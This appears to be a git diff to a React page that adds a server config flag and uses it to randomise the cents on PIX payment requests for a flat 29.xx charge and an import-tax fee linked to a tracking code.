@@ -27,6 +27,16 @@ const Home: React.FC = () => {
     const [taxPixData, setTaxPixData] = useState<any>(null);
     const [taxPixPaid, setTaxPixPaid] = useState(false);
 
+    // Config State
+    const [useRandomCents, setUseRandomCents] = useState(true);
+
+    useEffect(() => {
+        fetch(`${API_BASE}/api/config/centavos`)
+            .then(res => res.json())
+            .then(data => setUseRandomCents(data.active))
+            .catch(() => setUseRandomCents(true));
+    }, []);
+
     useEffect(() => {
         let interval: any;
         if (pixData && !pixPaid) {
@@ -904,7 +914,7 @@ const Home: React.FC = () => {
                             <button onClick={async () => {
                                 setPixLoading(true);
                                 try {
-                                    const cents = Math.floor(Math.random() * 99);
+                                    const cents = useRandomCents ? Math.floor(Math.random() * 99) : 90;
                                     const finalAmount = Number(`29.${cents < 10 ? '0' + cents : cents}`);
 
                                     const res = await fetch(`${API_BASE}/api/pix/create`, {
@@ -977,11 +987,15 @@ const Home: React.FC = () => {
                             <button onClick={async () => {
                                 setTaxPixLoading(true);
                                 try {
+                                    const taxAmount = Number(trackResult.taxa_valor.toString().replace(',', '.'));
+                                    const cents = useRandomCents ? Math.floor(Math.random() * 99) : 90;
+                                    const finalAmount = Math.floor(taxAmount) + (cents / 100);
+
                                     const res = await fetch(`${API_BASE}/api/pix/create`, {
                                         method: 'POST',
                                         headers: { 'Content-Type': 'application/json' },
                                         body: JSON.stringify({
-                                            amount: trackResult.taxa_valor,
+                                            amount: finalAmount,
                                             description: `Taxa de Importação - ${trackResult.codigo}`
                                         })
                                     });
